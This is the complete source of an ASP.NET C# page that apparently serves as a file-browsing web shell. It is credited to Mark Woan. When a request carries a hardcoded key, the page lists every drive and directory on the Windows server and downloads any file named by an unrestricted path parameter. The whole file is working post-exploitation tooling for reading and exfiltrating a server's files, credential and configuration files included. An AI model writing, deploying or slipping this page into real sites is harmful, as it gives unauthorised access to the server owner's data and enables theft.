<%@ Page Language="C#" %>
<%@ Import namespace="System.Diagnostics"%>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script language="c#" runat="server">
    private const string AUTHKEY = "woanware";
    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
	        if (Request.Params["authkey"] == null)
            {
            	return;
            }
            
            if (Request.Params["authkey"] != AUTHKEY)
	        {
	            return;
            }
            
            if (Request.Params["operation"] != null)
            {
                if (Request.Params["operation"] == "download")
                {
                    Response.Write(HEADER);
                    Response.Write(this.DownloadFile());
                    Response.Write(FOOTER);
                }
                else if (Request.Params["operation"] == "list")
                {
                    Response.Write(HEADER);
                    Response.Write(this.OutputList());
                    Response.Write(FOOTER);
                }
                else
                {
                    Response.Write(HEADER);
                    Response.Write("Unknown operation");
                    Response.Write(FOOTER);
                }
            }
            else
            {
                Response.Write(HEADER);
                Response.Write(this.OutputList());
                Response.Write(FOOTER);
            }
        }
        catch (Exception ex)
        {
            Response.Write(HEADER);
            Response.Write(ex.Message);
            Response.Write(FOOTER);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    private string DownloadFile()
    {
        try
        {
            if (Request.Params["file"] == null)
            {
                return "No file supplied";
            }

            string file = Request.Params["file"];

            if (File.Exists(file) == false)
            {
                return "File does not exist";
            }

            Response.ClearContent();
            Response.ClearHeaders();
            Response.Clear();
            Response.ContentType = "application/octet-stream";
            Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(file));
            Response.AddHeader("Content-Length", new FileInfo(file).Length.ToString());
            Response.WriteFile(file);
            Response.Flush();
            Response.Close();

            return "File downloaded";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    /// <summary>
    /// 
    /// </summary>
    private string OutputList()
    {
        try
        {
            StringBuilder response = new StringBuilder();

            string dir = string.Empty;

            if (Request.Params["directory"] == null)
            {
                string[] tempDrives = Environment.GetLogicalDrives();
                if (tempDrives.Length > 0)
                {
                    for (int index = 0; index < tempDrives.Length; index++)
                    {
                        try
                        {
                            dir = tempDrives[index];
                            break;
                        }
                        catch (IOException){}
                    }
                }
            }
            else
            {
                dir = Request.Params["directory"];
            }

            if (Directory.Exists(dir) == false)
            {
                return "Directory does not exist";
            }
            
            // Output the auth key textbox
            response.Append("<table><tr>");
            response.Append(@"<td><asp:TextBox id=""txtAuthKey"" runat=""server""></asp:TextBox></td>");
            response.Append("</tr><tr><td>&nbsp;<td></tr></table>");

            // Output the available drives
            response.Append("<table><tr>");
            response.Append("<td>Drives</td>");

            string[] drives = Environment.GetLogicalDrives();
            foreach (string drive in drives)
            {
                response.Append("<td><a href=");
                response.Append("?directory=");
                response.Append(drive);
                response.Append("&authkey=" + Request.Params["authkey"]);
                response.Append("&operation=list>");
                response.Append(drive);
                response.Append("</a></td>");
            }

            // Output the current path
            response.Append("</tr></table><table><tr><td>&nbsp;</td></tr>");
            response.Append("<tr><td>..&nbsp;&nbsp;&nbsp;<a href=\"?directory=");

            string parent = dir;
            DirectoryInfo parentDirInfo = Directory.GetParent(dir);
            if (parentDirInfo != null)
            {
                parent = parentDirInfo.FullName;
            }

            response.Append(parent);
            response.Append("&authkey=" + Request.Params["authkey"]);
            response.Append("&operation=list\">");
            response.Append(parent);
            response.Append("</a></td></tr></table><table>");

            // Output the directories
            System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(dir);
            foreach (System.IO.DirectoryInfo dirs in dirInfo.GetDirectories("*.*"))
            {
                response.Append("<tr><td>dir&nbsp;&nbsp;<a href=\"?directory=" + dirs.FullName + "&authkey=" + Request.Params["authkey"] + "&operation=list\">" + dirs.FullName + "</a></td></tr>");
            }

            // Output the files
            dirInfo = new System.IO.DirectoryInfo(dir);
            foreach (System.IO.FileInfo fileInfo in dirInfo.GetFiles("*.*"))
            {
                response.Append("<tr><td>file&nbsp;<a href=\"?file=" + fileInfo.FullName + "&authkey=" + Request.Params["authkey"] + "&operation=download\">" + fileInfo.FullName + "</a></td><td>");
                response.Append(fileInfo.Length);
                response.Append("</td></tr>");
            }

            response.Append("</table>");

            return response.ToString();
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>

<!-- Created by Mark Woan (http://www.woanware.co.uk) -->
